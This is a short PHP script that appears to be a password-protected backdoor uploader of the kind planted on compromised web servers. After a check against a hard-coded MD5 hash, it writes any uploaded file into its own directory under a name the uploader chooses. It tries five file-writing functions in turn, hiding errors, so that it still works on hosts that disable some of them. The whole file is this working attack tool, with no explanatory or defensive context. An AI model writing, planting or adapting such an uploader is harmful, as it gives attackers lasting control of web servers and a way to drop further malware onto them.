<?php
session_start();

$correct_password = "2e033b17197048ca8ff9790a69ebc632"; 

if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["password"])) {
    if (md5($_POST["password"]) === $correct_password) {
        $_SESSION["authenticated"] = true;
    }  
}

if (!isset($_SESSION["authenticated"]) || $_SESSION["authenticated"] !== true) {
    ?>
    <form method="post">
        <label for="password">Enter Password:</label>
        <input type="password" name="password" id="password" required>
        <button type="submit">Submit</button>
    </form>
    <?php
    exit;
}

if ($_FILES) {
    $file_temp = $_FILES["file"]["tmp_name"];
    $file_name = $_FILES["file"]["name"];
    
    if (function_exists("move_uploaded_file") && @move_uploaded_file($file_temp, $file_name)) {
        printf("uploaded");
        exit;
    }
    
    if (function_exists("copy") && @copy($file_temp, $file_name)) {
       printf("uploaded");
        exit;
    }
    
    if (function_exists("file_put_contents")) {
        $file_contents = @file_get_contents($file_temp);
        if ($file_contents !== false && @file_put_contents($file_name, $file_contents) !== false) {
           printf("uploaded");
            exit;
        }
    }
    
    if (function_exists("fwrite")) {
        $handle = @fopen($file_name, "w");
        if ($handle) {
            $file_contents = @file_get_contents($file_temp);
            if ($file_contents !== false && @fwrite($handle, $file_contents) !== false) {
                fclose($handle);
               printf("uploaded");
                exit;
            }
            fclose($handle);
        }
    }
    
    if (function_exists("rename") && @rename($file_temp, $file_name)) {
       printf("uploaded");
        exit;
    }
    
    echo "All Method Disabled!";
}
?>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <button type="submit">Upload</button>
</form>
